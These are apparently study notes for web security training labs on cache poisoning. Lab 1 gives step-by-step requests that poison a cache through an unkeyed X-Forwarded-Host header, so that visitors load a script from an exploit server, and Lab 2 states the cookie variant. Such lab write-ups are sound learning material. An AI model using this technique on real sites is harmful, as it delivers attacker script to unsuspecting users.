## Lab - 1: Web cache poisoning with an unkeyed header (P)

- This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

- send the `/` request to Burp Repeater
- send

```
GET /?abc=123 HTTP/1.1
X-Forwarded-Host: test.com
...
```

- Response is

```
Age: 0
X-Cache: miss
```

- send second time

```
Age: 5
X-Cache: hit
```

- and in response body, find the test.com

```html
<script
  type="text/javascript"
  src="//test.com/resources/js/tracking.js"
></script>
```

- go to the exploit server and in the File, fill with
  `/resources/js/tracking.js` and in the body `alert(document.domain)`

- change the `X-Forwarded-Host` to exploit server url without https

- send the resquest and see the response like above
- change the GET endpoint to `/` home page and send the request

---

## Lab - 2: Web cache poisoning with an unkeyed cookie (P)

- This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.
